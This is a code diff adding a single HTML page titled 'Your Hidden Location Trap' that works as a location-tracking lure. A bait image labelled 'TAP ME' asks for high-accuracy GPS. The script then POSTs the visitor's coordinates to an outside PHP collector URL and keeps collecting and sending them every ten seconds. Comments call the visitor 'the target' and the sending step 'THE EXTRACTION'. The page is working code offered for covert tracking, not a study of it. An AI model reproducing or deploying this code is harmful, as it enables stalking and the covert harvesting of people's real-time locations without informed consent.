@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Hidden Location Trap 😈</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #1a1a2e; /* Dark Hacker Theme */
+            color: #e94560; /* Aggressive Red */
+            text-align: center;
+            padding: 20px;
+        }
+        #location-display {
+            margin-top: 20px;
+            font-size: 1.8em; /* Bigger, louder display */
+            font-weight: bold;
+            color: #533483;
+            min-height: 50px; 
+            word-wrap: break-word; /* Handles long addresses */
+        }
+        .trigger-image {
+            width: 350px; /* Bigger bait */
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.7);
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .trigger-image:hover {
+            transform: scale(1.05) translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- THE TRIGGER: This is the image they click -->
+    <img 
+        class="trigger-image" 
+        src="https://via.placeholder.com/350x250/E94560/FFFFFF?text=TAP+ME+FOR+YOUR+LOCATION" 
+        onclick="getLocation()" 
+        alt="Click Here to Reveal Location"
+    >
+
+    <div id="location-display">
+        Waiting for click... ⏳ (Awaiting GPS Signal)
+    </div>
+
+    <script>
+        // ===================================================================
+        // 💥!!! THE MOST IMPORTANT LINE: YOUR LINK IS ADDED HERE !!!💥
+        // ===================================================================
+        // The script knows exactly where your PHP Collector is living!
+        const SERVER_ENDPOINT = "https://maddow056-alt.github.io/pak-location-hunt/receive_location.php";
+
+        // Set the interval time (10000ms = 10 seconds).
+        const INTERVAL_TIME = 10000; 
+
+        // --- MAIN FUNCTION: Runs the GPS Capture ---
+        function getLocation() {
+            const display = document.getElementById('location-display');
+            display.innerHTML = 'Scanning... 📡';
+
+            if (navigator.geolocation) {
+                
+                // 1. Request Location (The initial capture)
+                navigator.geolocation.getCurrentPosition(
+                    // SUCCESS CALLBACK: DATA CAPTURED!
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        // 2. THE REVEAL: Show the coordinates to the target
+                        display.innerHTML = `✅ FOUND! LAT: ${lat.toFixed(6)}, LON: ${lon.toFixed(6)}`;
+                        
+                        // 3. THE EXTRACTION: Send the data to the server
+                        sendLocationToServer(lat, lon);
+                        
+                        // 4. START THE TIMER: Keep checking every 10 seconds!
+                        startTrackerTimer(lat, lon);
+                    },
+                    // ERROR CALLBACK: WHAT HAPPENS IF THEY DENY OR FAIL?
+                    (error) => {
+                        let errorMessage = "Permission Denied or Location Unavailable.";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "⛔ Permission DENIED! They blocked the tracker.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "❓ Location Unavailable! No GPS signal found.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "⏰ Timeout! Too slow to capture location.";
+                                break;
+                        }
+                        display.innerHTML = `❌ ${errorMessage}`;
+                    },
+                    // OPTIONS: High Accuracy, 10 second timeout
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById('location-display').innerHTML = '🚫 Browser DOES NOT support Geo API!';
+            }
+        }
+
+        // --- TIMER FUNCTION: Keeps the script running forever ---
+        function startTrackerTimer(initialLat, initialLon) {
+            // This loop runs the check every 10 seconds.
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        // Update the display with the NEW coordinates
+                        document.getElementById('location-display').innerHTML = `🔄 Updating... LAT: ${lat.toFixed(6)}, LON: ${lon.toFixed(6)}`;
+                        
+                        // Send the new data to the server
+                        sendLocationToServer(lat, lon);
+                    },
+                    // If signal is lost, warn the user
+                    (error) => {
+                        document.getElementById('location-display').innerHTML = '⚠️ Signal Loss... Retrying...';
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 } // Check faster (5 seconds)
+                );
+            }, INTERVAL_TIME); // Runs every 10,000 milliseconds (10 seconds)
+        }
+
+
+        // --- SEND FUNCTION: The Data Pipeline to YOUR SERVER ---
+        function sendLocationToServer(latitude, longitude) {
+            fetch(SERVER_ENDPOINT, {
+                method: 'POST', 
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `lat=${latitude}&lon=${longitude}&source=PersistentTracker`
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Location successfully sent to server:', data.message);
+            })
+            .catch(error => {
+                console.error('💥 CRITICAL ERROR sending location to server:', error);
+            });
+        }
+    </script>
+</body >
+</html>
